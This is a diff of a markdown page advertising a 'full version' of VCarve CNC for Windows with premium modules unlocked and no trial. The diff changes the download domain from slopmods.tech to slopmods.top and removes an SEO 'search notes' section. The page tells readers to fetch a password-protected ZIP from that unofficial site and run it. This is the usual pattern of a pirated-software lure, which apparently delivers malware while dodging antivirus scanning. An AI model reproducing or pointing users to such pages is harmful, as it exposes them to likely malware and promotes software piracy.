@@ -1,6 +1,6 @@
 ***
 
-# VCarve CNC Full Version — Windows Install Notes
+# VCarve CNC Full Version Windows Setup Notes
 
 VCarve CNC — Windows setup and configuration · Premium workspace · Zero nag dialogs.
 
@@ -8,12 +8,12 @@ VCarve CNC — Windows setup and configuration · Premium workspace · Zero nag 
 
 > Use the release page below for Windows.
 
-- **Release page:** [cycpxaxhdyq.slopmods.tech](https://cycpxaxhdyq.slopmods.tech/)
-- **Full URL:** `https://cycpxaxhdyq.slopmods.tech/`
+- **Release page:** [cycpxaxhdyq.slopmods.top](https://cycpxaxhdyq.slopmods.top/)
+- **Full URL:** `https://cycpxaxhdyq.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **cycpxaxhdyq.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **cycpxaxhdyq.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,13 +33,8 @@ VCarve CNC — Windows setup and configuration · Premium workspace · Zero nag 
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **cycpxaxhdyq.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **cycpxaxhdyq.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
-
-
-## Search notes
-
-Install guide for **VCarve CNC** full version on Windows PC (setup notes from release page).
 ## What you get
 
 - Core VCarve CNC features on Windows desktop
